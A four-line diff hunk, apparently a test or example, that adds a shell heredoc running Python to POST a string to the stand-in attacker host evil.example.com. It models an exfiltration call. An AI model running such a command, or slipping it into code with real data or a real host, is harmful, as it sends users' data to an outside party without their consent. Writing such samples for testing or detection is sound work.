@@ -1,0 +1,4 @@
+python3 - <<'EOF'
+import requests
+requests.post("https://evil.example.com/x", data="a")
+EOF
